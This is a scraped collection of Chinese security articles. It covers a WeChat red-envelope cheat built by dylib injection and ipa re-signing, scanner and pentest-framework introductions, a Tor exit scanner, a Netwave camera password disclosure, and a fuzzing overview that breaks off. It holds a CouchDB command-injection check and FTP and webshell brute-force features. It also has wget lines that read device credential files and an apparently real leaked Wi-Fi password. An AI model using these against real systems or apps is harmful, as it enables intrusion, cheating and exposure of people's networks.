"5ccbf9f34f2f0a0a7a69bfea","眼看又到年关了，抢红包神器的需求很强烈！很急！很关键！","kong","0×00很急很关键郑重申明：外挂这东西，用来抢红包还是不太好，仅作技术研究用噢～眼看又到年关了，抢红包神器的需求很强烈！很急！很关键！这里只讨论iOS平台下的红包外挂，总的来说分两种：需越狱和无需越狱。需越狱的就简单了，参见github开源项目WeChatRedEnvelop，把代码clone下来，一个makepackage install就全部搞定了（当然啦，首先你得配置theos环境，这东西真的挺好用的），buginux这位选手就是《iOS应用逆向工程分析与实战》的作者（不是打广告，我也不是马甲！）。无需越狱的稍微复杂一点，涉及到的主要技术点包括逆向微信接收消息接口、一丢丢的协议逆向、dylib注入、ipa重签名。逆向微信接口其实没什么好说的，buginux已经帮我们搞定了，代码都写好了，就算没有这份代码，稍微耐心一点也应该没什么大问题，因为微信这种体量的App基本都不会做什么乱七八糟的保护的，手Q、淘宝、支付宝易燃，所以这里就不讨论怎么逆向了。相对而言，dylib注入和重签名才是最有讨论价值的。0×01 ipa重签名关于iOS下的签名机制，我觉得这篇文章已经讲的相当清晰了：《代码签名探析》，我这里就不拾人牙慧了（最重要的是我也说不清楚）。此处以微信iOS版为例，讲讲重签名的操作过程：1. 使用iOSSecAudit工具dump微信ipa到本地（就是小生上一篇文章《iOSSecAudit:一个iOSAPP安全审计工具    》中介绍的iOSSecAudit）图 1dump微信2.  解压ipa文件，ipa文件跟apk一样都是zip格式文件，Mac下直接双击就能解压，如果你喜欢用命令或者什么奇奇怪怪的工具都无所谓啦图 2解压ipa3.  删除原签名文件目录，见图3步骤24.  拷贝签名描述文件，见图3步骤3，是的，你首先得有自己的开发者证书（什么，你不知道啥是开发者证书？那无所谓了，你就当看着玩吧）5.  签名，见图3步骤46.  校验签名，见图3步骤5（没有输出即为正确）7.  打包为ipa文件，见图3步骤6图 3重签名8.  iOSSecAudit安装运行，测试是否成功，见图4图 4安装运行其中，签名时用到了一个entitlements.xml文件，其内容如图5；还有一个签名描述文件embedded.mobileproversion为开发者证书文件，你得有自己得开发者证书才有的啦。以上第3到第7步的重签名过程，其实可以写一个脚本来代替，对，我说的就是iOSSecAudit的resign命令。图 5entitlements.xmlipa重打包，重签名基本就这些，搞定以后，这个重打包的ipa就能安装到一个未越狱的iPhone上了。0×02 dylib注入关于OS X平台下的注入，一年半以前国外就有一篇文章讲的非常透彻了，原文链接：dylibhijacking on OS X，去年十一期间我在公司看到过翻译文章：译文链接（不过这个链接现在应该打不开了……吧，英文凑合着看吧，看不懂就硬着头皮看）。iOS下的注入，简单来说，大致思路是给binary添加一个Load Commands，每次启动的时候，这个Load Commands告诉系统在启动binary的时候要加载指定路径的dylib，然后你的那点小而脏的代码就可以执行了哈。嗯，这里需要对macho header格式非常熟悉。下面说下具体操作步骤：1.  用iOSSecAudit将dump回来的微信binary进行nonfat处理，否则会看到好几个macho头，不方便改动图 6nonfat操作2.  用MachoView打开nonfat后的binary文件，现在要添加一条如图7所示的LoadCommand图 7load command示例3.  我使用的是radare2对binary进行修改，使用radare2打开binary，如图8图 8radare2打开binary4.  原binary中最后一个load command的偏移为0x1bd0，command size为16，所以需在偏移0x1bd0+16处开始添加新的load command，然后按顺序写入Command、Command Size、Str Offset、Time Stamp、Current Version、Compatibility Version和Name字段，如图9图 9插入一条load command5.  最后修改Mach header中的Number of Load Commands（这个字段用于记录该macho文件中的LoadCommands总数）和Size of Load Commands字段（这个字段用于记录该macho文件中的Load Commands总大小），本例中这两个字段原来的值为73和7108，则新的Number  of Load Commands为73+1=74，新的Size ofLoad Commands为7108+48=71566.  另外，由于radare2写入符号“@”时，会出错（不知道是不是我不会用，谁会用的请通过各种渠道告诉我下），在第四步中我使用字母“a”来代替“@”，所以，最后还需要将“a”改成“@”，本例中使用UltraEdit进行编辑，如图10图 10修改@号7.  最后，还有一点需要注意的是，Current Version和Compatibility Version字段，最好直接给为0×0，因为系统在load dylib的时候，会检查dylib的版本号，如果此处的版本号大于dylib实际的版本号，则会导致crash（我是不会告诉你们这个版本号的问题坑了我一整晚的，还有那个“@”号坑了我一个小时，手动再见）。呵呵，因为theos编译出的dylib，其版本号为0×0。那么重点来了，如果一个命令就能将一个dylib注入到一个binary中，岂不快哉～对，我说的就是iOSSecAudit的 dlinj命令；再如果一个命令就能将一个dylib注入到binary，并将ipa进行重签名，岂不更快哉，嗯，我说的就是iOSSecAudit的 dlini命令。0×03非越狱外挂上线只需要把buginux的代码clone下来，make出一个dylib文件，文件名改成啥您随意就好，然后把dylib文件copy到微信binary的同目录下，一起签名，然后用0×02章节中的方法进行代码注入，再用0×01章节中的方法对ipa进行重签名，最后用iOSSecAudit安装，登陆进去就能展示红包外挂的威力了。最最最重要的是，如果一个命令就能将本文提到的dylib注入、重签名和安装，整个过程一键搞定，岂不……，您猜对了，就是iOSSecAudit的 dlinji命令！关于抢红包神器，只能说这么多了……如果直接就做个工具丢出来，只会让抢红包这件事情失去乐趣，更惨的是你会没朋友的，不要问我怎么知道的，捂屁股，哦不，捂脸。有兴趣的同学可以联系我的微博和Twitter（@Junejuly）一起交流。","2016-12-22 12:50:51","移动安全","红包外挂那点事","http://nsoad.com/Article/MobileSecurity/20161222/926.html"
"5ccbf9f34f2f0a0a7a69bfeb","巡风是一款适用于企业内网的漏洞快速应急、巡航扫描系统，通过搜索功能可清晰的了解内部网络资产分布情况，并且可指定漏洞插件对搜索结果进行快速漏洞检测并输出结果报表。","Kong","先放Github地址 ，部署和插件编写请依照 Github上的说明。https://github.com/ysrc/xunfeng坚持开源安全项目不容易，git clone 的时候求顺手转发。巡风简介巡风是一款适用于企业内网的漏洞快速应急、巡航扫描系统，通过搜索功能可清晰的了解内部网络资产分布情况，并且可指定漏洞插件对搜索结果进行快速漏洞检测并输出结果报表。由同程安全团队开发并对项目提供后续支持。项目主体分为两部分：网络资产识别引擎，漏洞检测引擎。网络资产识别引擎会通过用户配置的IP范围定期自动的进行端口探测（支持调用MASSCAN），并进行指纹识别，识别内容包括：服务类型、组件容器、脚本语言、CMS。漏洞检测引擎会根据用户指定的任务规则进行定期或者一次性的漏洞检测，其支持2种插件类型、标示符与脚本，均可通过web控制台进行添加。部署完毕后首先要配置资产ip范围才能使用，然后就是资产探测的周期。鼠标悬浮到问号icon上即有功能解释。 这样设计的初衷是为了甲方定期扫描内网资产漏洞的，如果用来扫外网，可能用起来感觉上会有些别扭，不是立即触发的。（请勿用于未授权的测试，YSRC不负任何连带责任。）项目中自带了我们编译好的MASSCAN，如果系统不适用或者不放心可以自行编译，建议启用MASSCAN（需要chmod+x给执行权限，需要运行在root下），会对全端口进行扫描，否则只探测设置的端口探测列表中的端口，对于一些部署在非标准端口的服务就探测不到了。另外就是为了方便更新插件和当有高危漏洞出现的时候，YSRC会推送插件更新信息，可以选择安装。有些安装过程可能会遇到的问题顺带在这里说下，一个是基础环境：Python 2.7和MongoDB 3.x，Python 2.6版本会有一些问题，MongoDB 2.x版本不支持全文索引，也是不兼容的，部署之前先确认下自己的环境符合要求，否则可能会遇到各种各样的bug。windows上面安装Python环境要选上 "" Entire feature will be ...""部署完了看下统计页面里面引擎的状态正常是显示❤，显示x的说明进程没起来，要看下什么问题。其他图就不截了，大家自己部署了看吧。因为项目是从内部系统中剥离出来的，会有些小bug。目前插件数量还比较少，也会有些误报的情况，欢迎提交pr和issue~感谢所有参与巡风测试的表哥们~扫描下方二维码关注YSRC公众号，回复自己的微信号+巡风，会有人拉你进巡风的微信讨论群，部署、插件编写遇到问题或者有什么想法都可以讨论。巡风巡风是一款适用于企业内网的漏洞快速应急、巡航扫描系统，通过搜索功能可清晰的了解内部网络资产分布情况，并且可指定漏洞插件对搜索结果进行快速漏洞检测并输出结果报表。其主体分为两部分：网络资产识别引擎，漏洞检测引擎。网络资产识别引擎会通过用户配置的IP范围定期自动的进行端口探测（支持调用MASSCAN），并进行指纹识别，识别内容包括：服务类型、组件容器、脚本语言、CMS。漏洞检测引擎会根据用户指定的任务规则进行定期或者一次性的漏洞检测，其支持2种插件类型、标示符与脚本，均可通过web控制台进行添加。安装指南基础环境需求：Python 2.7 MyGet运行与安装过程需要在管理员权限下进行# 官网国内下载较慢，我们提供了镜像地址，根据自己的系统下载对应的https://sec.ly.com/mirror/python-2.7.13.msihttps://sec.ly.com/mirror/python-2.7.13.amd64.msihttps://sec.ly.com/mirror/mongodb-linux-x86_64-3.4.0.tgzhttps://sec.ly.com/mirror/mongodb-linux-x86_64-ubuntu1604-3.4.0.tgzhttps://sec.ly.com/mirror/mongodb-linux-x86_64-ubuntu1404-3.4.0.tgzhttps://sec.ly.com/mirror/mongodb-win32-x86_64-2008plus-ssl-3.4.0-signed.msi安装相关依赖：# CentOSyum install gcc libffi-devel python-devel openssl-devel libpcap-devel# Ubuntu/Debiansudo apt-get update &amp;&amp; sudo apt-get install gcc libssl-dev libffi-dev python-dev libpcap-dev安装python依赖库：# 需先安装pip，建议使用豆瓣的pip源，否则可能会因为超时导致出错。    wget https://sec.ly.com/mirror/get-pip.py --no-check-certificatepython get-pip.py# 已经有pip需更新到最新版本pip install -U pippip install pymongo Flask xlwt paramikoLinux 部署流程启动服务：nohup ./mongod --port 65521 --dbpath DBData &amp;# DBData为数据库指定存在目录导入数据：./mongorestore -h 127.0.0.1 --port 65521 -d xunfeng db# db为初始数据库结构文件夹路径# 低版本不支持全文索引，需使用MongoDB 3.x版本增加认证：./mongo --port 65521use xunfengdb.createUser({user:'scan',pwd:'your password',roles:[{role:'dbOwner',db:'xunfeng'}]})exit# 请将 your password 换为你设定的密码。  停止服务：kill -9 $(pid of mongod)修改时区：echo TZ\='Asia/Shanghai'\; export TZ &gt;&gt; ~/.bash\_profilesource ~/.bash\_profile启动服务：# 根据实际情况修改Conifg.py和Run.sh文件sh Run.sh 启动服务。Windows 部署流程启动服务：mongod.exe --port 65521 --dbpath DBData# DBData为数据库指定存在目录。导入数据：mongorestore.exe -h 127.0.0.1 --port 65521 -d xunfeng db# db为初始数据库结构文件夹路径# 低版本不支持全文索引，需使用MongoDB 3.x版本增加认证：./mongo --port 65521use xunfengdb.createUser({user:'scan',pwd:'your password',roles:[{role:'dbOwner',db:'xunfeng'}]})exit# 请将 your password 换为你设定的密码。停止服务：Ctrl + c 关闭mongodb服务启动服务：# 根据实际情况修改Conifg.py和Run.bat文件。运行Run.bat 启动服务。配置指南在配置-爬虫引擎-网络资产探测列表 设置内网IP段（必须配置，否则无法正常使用）。在配置-爬虫引擎-资产探测周期 设置计划规则。可启用MASSCAN(探测范围为全端口)代替默认的端口探测脚本，需安装好MASSCAN后配置程序完整绝对路径，点击开启即可完成切换。其他配置根据自身需要进行修改。插件编写漏洞插件支持2种类型，标示符与python脚本，可以通过官方推送渠道安装或者自行添加。JSON标示符例子Python脚本插件标准非常简洁，只需通过 get_plugin_info 方法定义插件信息，check函数检测漏洞即可。# coding:utf-8import ftplibdef get_plugin_info():  # 插件描述信息    plugin_info = {        ""name"": ""FTP弱口令"",         ""info"": ""导致敏感信息泄露，严重情况可导致服务器被入侵控制。"",        ""level"": ""高危"",        ""type"": ""弱口令"",        ""author"": ""wolf@YSRC"",        ""url"": """",        ""keyword"": ""server:ftp"",  # 推荐搜索关键字    }    return plugin_infodef check(ip, port, timeout): # 漏洞检测代码    user_list = ['ftp', 'www', 'admin', 'root', 'db', 'wwwroot', 'data', 'web']    for user in user_list:        for pass_ in PASSWORD_DIC:  # 密码字典无需定义，程序会自动为其赋值。            pass_ = str(pass_.replace('{user}', user))            try:                ftp = ftplib.FTP()                ftp.timeout = timeout                ftp.connect(ip, port)                ftp.login(user, pass_)                if pass_ == '': pass_ = ""null""                if user == 'ftp' and pass_ == 'ftp: return u""可匿名登录""                return u""存在弱口令，账号：%s，密码：%s"" % (user, pass_)  # 成功返回结果，内容显示在扫描结果页面。            except:                pass此外系统内嵌了辅助验证功能:DNS：触发，nslookup randomstr IP，验证， http://ip/randomstr ，返回YES即存在。HTTP：触发，http://ip/add/randomstr ，验证， http://ip/check/randomstr ，返回YES即存在。使用例子:import urllib2import randomimport socketdef get_plugin_info():  # 插件描述信息    plugin_info = {        ""name"": ""CouchDB未授权访问"",         ""info"": ""导致敏感信息泄露，攻击者可通过控制面板执行系统命令，导致服务器被入侵。"",        ""level"": ""高危"",        ""type"": ""未授权访问"",        ""author"": ""wolf@YSRC"",        ""url"": """",        ""keyword"": ""server:couchdb"",  # 推荐搜索关键字    }def get_ver_ip():    csock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)    csock.connect(('8.8.8.8', 80))    (addr, port) = csock.getsockname()    csock.close()    return addrdef random_str(len):    str1=""""    for i in range(len):        str1+=(random.choice(""ABCDEFGH1234567890""))    return str(str1)def check(ip,port,timeout):    rand_str = random_str(8)    cmd = random_str(4)    server_ip = get_ver_ip()    req_list = [        [""/_config/query_servers/%s""%(cmd),'""nslookup %s %s&gt;log""'%(rand_str,server_ip)],        [""/vultest123"",''],        [""/vultest123/test"",'{""_id"":""safetest""}']    ]    for req_info in req_list:        try:            request = urllib2.Request(url+req_info[0],req_info[1],timeout=timeout)            request.get_method = lambda: 'PUT'            urllib2.urlopen(request)        except:            pass    try:        req_exec = urllib2.Request(url + ""/vultest123/_temp_view?limit=11"",'{""language"":""%s"",""map"":""""}'%(cmd))        req_exec.add_header(""Content-Type"",""application/json"")        urllib2.urlopen(req_exec)    except:        pass    check = urllib2.urlopen(""http://%s/%s""%(server_ip,rand_str)).read()    if 'YES' in check:        return u""未授权访问""流程演示视频https://sec-pic-ly.b0.upaiyun.com/xunfeng/xunfeng.mp4#演示数据为填充数据文件结构│  Config.py  # 配置文件│  README.md  # 说明文档│  Run.bat  # Windows启动服务│  Run.py  # webserver│  Run.sh    # Linux启动服务，重新启动前需把进程先结束掉│  ├─aider│      Aider.py  # 辅助验证脚本│      ├─db  # 初始数据库结构│      ├─masscan  # 内置编译好的Masscan程序（CentOS win64适用），需要chmod+x给执行权限（root），若无法使用请自行编译安装。 ├─nascan│  │  NAScan.py # 网络资产信息抓取引擎│  │  │  ├─lib│  │      common.py 其他方法│  │      icmp.py  # ICMP发送类│  │      log.py  # 日志输出│  │      mongo.py  # 数据库连接│  │      scan.py  # 扫描与识别│  │      start.py  # 线程控制│  │      │  └─plugin│          masscan.py  # 调用Masscan脚本│          ├─views│  │  View.py  # web请求处理│  │  │  ├─lib│  │      Conn.py  # 数据库公共类│  │      CreateExcel.py  # 表格处理│  │      Login.py  # 权限验证│  │      QueryLogic.py  # 查询语句解析│  │      │  ├─static #静态资源目录│  │              │  └─templates #模板文件目录│          └─vulscan    │  VulScan.py  # 漏洞检测引擎    │      └─vuldb # 漏洞库目录扫描下方二维码关注YSRC公众号，回复自己的微信号+巡风，会有人拉你进巡风的微信讨论群。","2017-01-07 15:00:04","安全工具","YSRC诚意之作，巡风-企业安全漏洞快速应急、巡航系统","http://nsoad.com/Security-tools/20170107/tools-995.html"
"5ccbf9f34f2f0a0a7a69bfec","3xp10it是一个自动化渗透测试框架,目前没有做到完全自动化。","quanyechavshuo","About 3xp10it3xp10it是一个自动化渗透测试框架,目前没有做到完全自动化[自动上传漏洞利用框架和自动fuzz框架暂时没有加入。b)支持功能列表高危漏洞扫描模块爬虫模块目标网站脚本类型检测目录扫描模块sqli扫描模块robots/sitemap自动收集cms识别与cms漏洞扫描模块自动识别管理员页面并爆破[支持自动识别简单验证码]webshell自动查找与爆破,支持asp,php,aspx,jsp,支持chopper一句话webshell和大马类型webshella)apache,iis,nginx,lighttpd在phpstudy中测试默认可接收1000个post参数  b)一句话类型webshell根据上面的特点可以正常情况下(单线程)的1000倍速度来爆破,可用大字典爆破,但是不能用多线程,可能是因为用多线程会太快而让web server觉得每次的参数不止1000个  c)其他类型web server未测试,暂用多线程1倍速爆破,用最常用的webshell较小字典,17659个左右  d)大马类型webshell由于表单名是一定的,所以不能以1000倍速爆破,于是也用和c)中一样的小字典多线程1倍速爆破 whois信息收集资源文件收集自动尝试获取cdn后的真实Ip旁站获取[获取真实Ip后再获取旁站,如果有cdn但是没有获取到真实ip则不进行旁站获取]子站获取c)可选工作模式模式一:扫描目标和目标的所有旁站模式二:扫描目标和目标的所有子站模式三:扫描目标和目标的所有旁站和所有子站模式四:只扫描目标默认使用模式一扫描[在运行3xp10it后可自选],上面四种模式中的[扫描目标]里的目标支持批量导入多个目标和手工录入多个目标.四种工作模式中与旁站和子站相关的由程序自动完成[eg.选择模式三工作时,将自动获取导入的目标的所有旁站和所有子站,并对这些旁站和子站依次遍历上面的各个扫描模块]d)特点可在中断后重新运行时从断点附近接着上次的过程扫描,不用重新扫描运行3xp10it后自动从数据库中取出待完成的扫描任务进行扫描支持正常扫描和优先扫描两个扫描组,如果优先扫描组里有任务则先扫描优先扫描组里的目标,在添加任务时可选择将目标是正常扫描还是优先扫描上述支持功能列表中的功能默认全部遍历扫描,如果要使用单个模块可在web界面使用3xp10it配备一个web后台,web页面可查询当前扫描结果与使用单个模块功能3xp10it独立于web运行,也即没有目录下的pannel文件夹也可运行目录下的pannel文件夹是Django为3xp10it写的一些相关界面,web界面使用在下面介绍支持找到高危漏洞邮件通知[eg.sqli,webshell爆破成功等]e)web后台说明web后台如下图,需要管理员身份登录才可进后台web后台相当于3xp10it的部分界面+分割的模块化工具+exp10it中没有的功能的附加工具的集合web后台由Django==1.10.3开发web后台中支持工具列表targets:查看扫描目标,新增/删除扫描目标xcdn:尝试识别cdn背后的真实ip[3xp10it中没有这个功能]高危漏扫:高危漏洞扫描模块sqli:sql注入模块扫目录:目录扫描模块cms漏扫:cms漏洞扫描模块webshell爆破:webshell爆破模块管理员登录爆破:管理员登录爆破模块waf爆破:waf自动爆破模块[3xp10it中没有这个功能]dbquery:数据库语句执行接口扫描结果:查看当前扫描结果Disclaimer[!] legal disclaimer: Usage of 3xp10it.py and web.py for attacking targets without prior mutual consent is illegal.It is the end user's responsibility to obey all applicable local, state and federal laws.Developersassume no liability and are not responsible for any misuse or damage caused by this program.Installgit clone https://github.com/3xp10it/3xp10it.gitUsagebash beforeWork.sh[这一步安装相关依赖,第一次使用本工具时需要运行,以后不用再运行]python3 3xp10it.py[主程序,工作时运行,第一次运行时需要先运行上面的beforeWork.sh]python3 web.py[可选,如果运行则要新开一个终端运行以便于查看相关输出信息,该工具为web后台]Requirementneed python3need pip3mysqlworks on linux(test on ubuntu and kali2.0,others not test)python3安装可参考如下步骤:    apt-get install python3    或:    wget https://www.python.org/ftp/python/3.5.2/Python-3.5.2.tar.xz    tar xJf Python-3.5.2.tar.xz    cd Python-3.5.2    ./configure --prefix=/opt/python3    make &amp;&amp; make install    ln -s /opt/python3/bin/python3.5 /usr/local/bin/python3    pip3安装:apt-get install -y python3-pipkali linux2安装pip3可参考如下步骤:    echo ""deb-src http://http.kali.org/kali kali main non-free contrib"" &gt;&gt; /etc/apt/sources.list    echo ""deb-src http://security.kali.org/kali-security kali/updates main contrib non-free"" &gt;&gt;/etc/apt/sources.list    apt-get update    apt-get install python3-pipDetail1.3xp10it需要用到bingapi,需要先申请好bingapi2.上面的web.py不一定要运行,核心功能在3xp10it.py文件中3.如果要后台功能需运行python3 web.py4.如果要使用web.py,重新开机后需要重新运行web.py5.运行web.py常见错误:端口被占用.解决方法:a)netstat -ntlp | grep 8000b)在a)中找到pid后kill -9 pidc)重新运行python3 web.py6.3xp10it中调用的是关键模块exp10it中的exp10itScanner,exp10it模块由pip3 install exp10it安装,安装路径一般如下:/usr/local/lib/python3.5/dist-packages7.文件分布结构如下:当前目录 .├── 3xp10it.py├── pannel│   ├── ghostdriver.log│   ├── manage.py│   ├── models.py[web后台没有用django的模型]│   ├── pages[web页面的html文件,相当于django的template]│   └── pannel[django相关文件]│       ├── __init__.py│       ├── settings.py│       ├── urls.py[django配置的访问与响应规则]│       ├── views.py[django配置的关键函数]│       └── wsgi.py├── readme.md├── uninstall.py└── web.py/usr/local/lib/python3.5/dist-packages路径下相关文件├── cms_identify[cms识别模块相关文件]├── cms_scan[cms漏洞扫描模块相关文件]├── config.ini[配置文件]├── dicts[字典文件]├── dirsearch[目录扫描模块相关文件]├── exp10it.py[关键模块文件]├── exps[exp模块相关文件]├── log[日志文件夹]├── tools[web后台中的各个工具]FAQQ0:config.ini 这个文件怎么没有找到?A0:config.ini在python3 3xp10it.py初次运行后会自动生成,用于设置bing API key,发邮件的帐号,数据库连接配置,扫描模式等信息,一般会在/usr/local/lib/python3.5/dist-packages/config.ini这里,与python3的安装路径有关Todo增加端口扫描模块(unfinished)Changelog[+] 修改exp10it.py中create table %s为create table `%s`[包括其他关于表名处的%s全部换成`%s`],如果没有``将会在表名为abc-def格式(中间有-符号)情况下建表失败[+] 在与获取旁站有关的功能上自动尝试获取cdn后真实ip再获取旁站,如果确定有cdn但是没有获取到真实ip则不再获取假的旁站[+] webshell爆破速度提升1000倍(接地气思路,适用于一句话类型webshell)","2017-01-10 12:28:25","安全工具","3xp10it自动化渗透测试框架1.0","http://nsoad.com/Security-tools/20170110/tools-1004.html"
"5ccbf9f44f2f0a0a7a69bfed","Exitmap是一个基于Python的Tor出口中继节点扫描器，具有快速和模块化的特点。","Carrie","工具简介Exitmap是一个基于Python的Tor出口中继节点扫描器，具有快速和模块化的特点。 Exitmap模块执行在所有出口中继节点（的子集）上运行的任务。如果你有函数式编程的知识背景，可以把Exitmap看作是Tor出口中继节点的map（）接口。这些模块可以执行任何基于TCP的网络任务，例如获取网页、上传文件、连接到SSH服务器或加入IRC频道（Internet Relay Chat，互联网中继聊天，它是由芬兰人Jarkko Oikarinen于1988年首创的一种网络聊天协议）。Exitmap的实际功能是监测出口中继节点的可靠性。当然很多人会利用Exitmap在Tor项目的检查服务中检查误报情况，并发现恶意的出口中继节点。为Exitmap开发新的模块也非常便捷，只需查看doc或目录中的HACKING文件，或者查看其中一个现有模块即可。Exitmap使用Stem为所有给定的出口中继节点创建线路，并且一旦tor向Exitmap发出线路已建立的通知，Exitmap就会为新建立的线路调用模块。模块可以是纯Python脚本，也可以是可执行文件。对于可执行文件则需要用到torsocks工具（https://github.com/dgoulet/torsocks/）。最后请注意Exitmap是一个网络评估工具，对普通的Tor用户没有用。Tor项目正在定期运行该工具，过多的Exitmap扫描只会导致额外的网络负载。Exitmap之所以开源是因为有人可能会对其源代码和结构感兴趣。安装Exitmap使用Stem库（Tor的python控制器库）与Tor进行交互。安装Stem的方式很多，最简单的应该是使用pip与现有的requirements.txt文件结合：$ pip install -r requirements.txt运行ExitmapExitmap所需的唯一参数是模块名称。例如，你可以通过以下方式运行Exitmap的checktest模块：$ ./bin/exitmap checktest然后命令行输出将显示如何进行Tor bootstrap，checktest模块输出和扫描摘要。如果你不需要3个hops，倾向于使用在静态的第一个hop之后的两个hops,请运行：$ ./bin/exitmap --first-hop CCEF02AA454C0AB0FE1AC68304F6D8C4220C1912 checktest若在德国出口中继节点上运行同样的测试，请执行：$ ./bin/exitmap --country DE --first-hop CCEF02AA454C0AB0FE1AC68304F6D8C4220C1912 checktest如果要在线路创建之间暂停五秒钟以减少Tor网络和扫描目标的负载，请运行：$ ./bin/exitmap --build-delay 5 checktest注意：CCEF02AA454C0AB0FE1AC68304F6D8C4220C1912是一个由瑞典卡尔斯塔德大学运行的出口节点，你可以自由使用。但是分配扫描负载时请尽量使用自己的出口中继节点。    若想看到Exitmap的其它选项，请运行：$ ./bin/exitmap --help功能Exitmap包含以下模块：testfds：测试某出口中继节点是否能够获取简单网页的内容。若不能则说明该出口中继节点可能没有足够可用的文件描述符（打开一个文件需要维护很多数据，不光是权限的问题，内核对每一个打开文件都分配了一个数据结构，而文件描述符则是指向这些数据结构的索引，内核可以通过一个文件描述符查到相应文件的数据）。checktest：尝试发现Tor项目检查服务中的误报。dnspoison：尝试解析多个域名，并将接收到的DNS A记录与预期记录进行比较。dnssec：检测解析器不证实DNSSEC（DNS安全扩展）的出口中继节点。patchingCheck：检查是否存在文件篡改。cloudflared：检查网站是否返回CloudFlare的验证码。rtt：测量从某出口到各个目的地的往返时间。配置默认状态下，Exitmap会读取你的主目录中的.exitmaprc文件。该文件能够接受所有命令行选项，但是你必须用下划线代替减号。例如：[Defaults]first_hop = CCEF02AA454C0AB0FE1AC68304F6D8C4220C1912verbosity = debugbuild_delay = 1analysis_dir = /path/to/exitmap_scans测试在提交代码合并请求之前，通过运行以下程序来确认所有配置均已通过测试：$ pip install -r requirements-dev.txt$ py.test --cov-report term-missing --cov-config .coveragerc --cov=src testExitmap下载链接：https://codeload.github.com/NullHypothesis/exitmap/zip/v2016.04.21若对Exitmap的使用存在任何问题，可联系Philipp Winter phw@nymity.ch。","2017-01-24 13:15:26","安全工具","Exitmap：Tor出口中继节点扫描器","http://nsoad.com/Security-tools/20170124/tools-1036.html"
"5ccbf9f44f2f0a0a7a69bfee","看到 exploit-db.com 中报了一个《Netwave IP Camera - Password Disclosure》漏洞, 这个漏洞包含了wifi密码与Web的账号泄露。","MyKings","Author：MyKings(知道创宇404实验室)看到 exploit-db.com 中报了一个《Netwave IP Camera - Password Disclosure》漏洞, 这个漏洞包含了wifi密码与Web的账号泄露。顺便使用了 zoomeye 搜索了下全球的这款网络摄像头, 发现用这个还挺多的。1 背景1.1 漏洞分析wget -qO- http://[HOST]:[PORT]//proc/kcore | stringswget -qO- http://[HOST]:[PORT]//etc/RT2870STA.datwget -qO- http://[HOST]:[PORT]//dev/rom0wget -qO- http://[HOST]:[PORT]/get_status.cgi1.1.1 get_status.cgi会泄露当前网络摄像头的一些配置信息:var sys_ver='21.37.2.47';  var app_ver='0.0.4.19';  var alias='002voam';  var now=1486976881;  var tz=-28800;  var alarm_status=0;  var ddns_status=0;  var ddns_host='';  var oray_type=0;  var upnp_status=0;  var p2p_status=0;  var p2p_local_port=20409;  var msn_status=0;  var wifi_status=0;  var temperature=0.0;  var humidity=0;  var tridro_error='';  1.1.2 /etc/RT2870STA.dat这里文件就是一个配置文件, 这里可以得到SSID与wifi密码。[Default]SSID=hang yue officeNetworkType=InfraChannel=0AuthMode=WPA2PSKEncrypType=AESWPAPSK=hangyuewifi1.1.3 /proc/kcore内存的map, 可以直接使用wget下载下来(需要注意这里要把wget进程结束才可以登录)。2 区域分布先来看一张使用 ZoomEye 搜索的结果, 可以看到搜索到 315,129 条。通过筛选分析后 11186 IP中存在包含wifi密码, 其中覆盖了111个国家和地区。这里近分析了中国香港地区的摄像头:无wifi密码962个WEP加密方式728个WPAPSK加密方式9496个查询看密码密码类型统计存数字 1807 个存字母 1405 个字母+数字 5585 个含特殊字符 1001 个密码用的最多TOP 10密码长度统计看的出大众还是使用8位、10位的密码较多。附上一张香港分析后的图, 红色代表没有密码的wifi, 黄色代表WEP加密方式, 蓝色代表WPAPSK方式。这个世界范围内存在摄像头密码泄漏的分布图。这张图示是根据SSID搜索到的一家公司内的IP摄像头截图。3 参考链接https://www.seebug.org/vuldb/ssvid-92650https://www.exploit-db.com/exploits/41236/","2017-02-23 14:47:38","无线安全","我是如何通过网络摄像头分析wifi密码的","http://nsoad.com/Article/wifi/20170223/1073.html"
"5ccbf9f44f2f0a0a7a69bfef","本文重点介绍一种可用于发现Android系统组件中不同类型的漏洞的fuzzing方法。","Kong","全文概述本文重点介绍一种可用于发现Android系统组件中不同类型的漏洞的fuzzing方法。 本文将介绍一种通用的漏洞挖掘方法以及他是怎么样应用在Android平台的。 以下是一个已经被发现漏洞的系统组件列表： Stagefright框架，mediaserver进程，Android APK安装进程，installd守护进程， dex2oat，ART。本文将涵盖许多主题，首先以实际的fuzzing过程开始,从数据/种子生成到测试用例执行,日志记录到最后Crash分类机制，并且讨论如何解决诸如错误,crash重现等挑战 ，整理出独特的crash，并根据crash的严重性对crash进行优先排序。 第二部分 本文将解释几个使用这种方法开发的工具的创造过程 ,接着将重点讨论工具的具体的技术细节，以及目前为止已经发现的bug，以及相关的CVE和可能可利用模式。Fuzzing简介Fuzzing是这样一种行为:利用漏洞检查工具，发送数据到组件，或对指定格式进行填充，完成数以万计的检查任务，来帮助我们发现软件中不期望有的漏洞的行为.一个完整的Fuzzing过程主要包括,生成测试数据,把测试数据交给目标程序来处理,观察程序是否出现非预期的行为,然后又回到第一步,不断循环.目前而言,大部分的漏洞都是通过Fuzzing挖掘到的.Android中的Fuzzing方法这一部分将介绍一系列可用于Fuzzing安卓系统组件的基本概念和方法 .数据生成Fuzzing通常可分为Bind fuzz,他的大致做法就是把测试数据的进行随机的变化,和智能fuzz,他的做法为首先需要用户定义好数据的大致结构,然后fuzzer基于这些规则进行随机数据生成,以及现在很火的反馈式fuzz,其特点为首先传入测试数据给程序, 然后通过对程序指令进行监控,看看程序执行路径,以此来对数据进行变异. 以Fuzz文件处理程序为例,bind fuzz的做法就是以一些字节为单位将他设置为一些随机的边界值,来生成文件.而智能fuzz的行为是,用户根据文件的格式,定义好规则,然后fuzzer根据这些规则,生成文件.下面是一些常用的fuzz工具.Basic fuzzing framework (BFF) – mutational fuzzer targeting software that consumes file inputZzuf – application input fuzzerRadamsa – general purpose test case generator for fuzzingFuzzbox – fuzzing tool specialized in targeting media codecsAmerican Fuzzy Lop (AFL) – instrumentation driven file format fuzzer提交数据给程序处理这一部分极大的依赖于我们所要测试的系统组件是什么,我们需要根据目标系统组件获取数据的方式,为他定制这一部分的实施方法.日志监控Android系统提供了一种收集系统调试信息的方法,即为logcat,通过logcat我们可以从系统的应用程序和其他组件收集各种信息,包括系统组件崩溃时的现场等等  同时logcat还支持过滤器来方便我们查看我们想要的日志..所以我们可以使用logcat作为我们对程序处理数据后的行为的监控器.下面是一个使用的例子.可以看到这里发现了一个程序 Fatal signal 11 (SIGSEGV) 的 